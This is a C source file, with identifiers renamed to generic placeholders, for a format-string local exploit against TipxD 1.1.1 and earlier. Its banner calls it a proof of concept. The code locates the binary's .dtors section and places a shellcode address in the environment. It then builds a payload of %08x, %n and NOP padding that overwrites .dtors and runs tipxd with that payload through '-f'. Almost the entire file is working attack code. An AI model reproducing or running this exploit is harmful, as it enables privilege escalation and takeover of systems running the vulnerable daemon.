
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int temp ;
typedef int buffer ;
typedef int FILE ;


 char* VAR_0 ;
 char* VAR_1 ;
 char* VAR_2 ;
 int FUNC_0 (char*,int) ;
 int FUNC_1 (int) ;
 int FUNC_2 (char*,char*,char*,char*,int *,char**) ;
 int FUNC_3 (int) ;
 int FUNC_4 (int *,char*,int*) ;
 int FUNC_5 (char*,char,int) ;
 int FUNC_6 (int *) ;
 int * FUNC_7 (char*,char*) ;
 int FUNC_8 (char*,...) ;
 char* VAR_3 ;
 int FUNC_9 (char*,char*,...) ;
 int FUNC_10 (char*,char*) ;
 int FUNC_11 (char*) ;
 int FUNC_12 (char*,char*,int) ;

int FUNC_13(int VAR_4, char *VAR_5[]) {

int VAR_6, VAR_7;
unsigned int VAR_8, VAR_9, VAR_10, VAR_11;
char VAR_12[512];
char VAR_13[1024];
char VAR_14[255], VAR_15[255];
char VAR_16[255], VAR_17[255];
int VAR_18, VAR_19, VAR_20, VAR_21;
FILE *VAR_22;
char *VAR_23[3] = {VAR_3, ((void*)0)};
int VAR_24 = 0xbffffffa - FUNC_11(VAR_3) - FUNC_11(VAR_2);


FUNC_9(VAR_12, "%s -s -j .dtors %s | %s ffffffff", VAR_1, VAR_2, VAR_0);
VAR_22 = FUNC_7(VAR_12, "r");
if(FUNC_4(VAR_22, " %08x", &VAR_7) != 1) {
FUNC_6(VAR_22);
FUNC_8("Cannot find .dtors address\n");
FUNC_3(1);
}
FUNC_6(VAR_22);
VAR_7 = VAR_7 + 4;

FUNC_8("\n TipxD <= 1.1.1 local exploit (Proof of Concept)\n");
FUNC_8(" by CoKi <coki@nosystem.com.ar>\n\n");
FUNC_8(" shellcode address = %.8p\n", VAR_24);
FUNC_8(" .dtors address = %.8p\n\n", VAR_7);

FUNC_0(VAR_12, sizeof(VAR_12));
FUNC_0(VAR_13, sizeof(VAR_13));

FUNC_10(VAR_13, "x");


for(VAR_6 = 0; VAR_6 < 4; VAR_6++) {
FUNC_0(VAR_12, sizeof(VAR_12));
FUNC_9(VAR_12, "%s", &VAR_7);
FUNC_12(VAR_13, VAR_12, 4);
VAR_7++;
}


FUNC_5(VAR_14, 0, 255);
FUNC_5(VAR_15, 0, 255);
FUNC_5(VAR_16, 0, 255);
FUNC_5(VAR_17, 0, 255);

VAR_8 = (VAR_24 & 0xff000000) >> 24;
VAR_9 = (VAR_24 & 0x00ff0000) >> 16;
VAR_10 = (VAR_24 & 0x0000ff00) >> 8;
VAR_11 = (VAR_24 & 0x000000ff);

VAR_18 = VAR_11 - 16 - 15 - 48 - 2 -1;
VAR_18 = FUNC_1(VAR_18);
VAR_19 = VAR_10 - VAR_11 - 2;
VAR_19 = FUNC_1(VAR_19);
VAR_20 = VAR_9 - VAR_10 - 2;
VAR_20 = FUNC_1(VAR_20);
VAR_21 = VAR_8 - VAR_9 - 2;
VAR_21 = FUNC_1(VAR_21);

FUNC_5(VAR_14, '\x90', VAR_18);
FUNC_5(VAR_15, '\x90', VAR_19);
FUNC_5(VAR_16, '\x90', VAR_20);
FUNC_5(VAR_17, '\x90', VAR_21);

FUNC_9(VAR_12, "%%08x%%08x%%08x%%08x%%08x%%08x"
"%s\xeb\x02%%n"
"%s\xeb\x02%%n"
"%s\xeb\x02%%n"
"%s\xeb\x02%%n\x90\x90\x90\x90"
,VAR_14, VAR_15, VAR_16, VAR_17);

FUNC_10(VAR_13, VAR_12);

FUNC_2(VAR_2, "tipxd", "-f", VAR_13, ((void*)0), VAR_23);
}
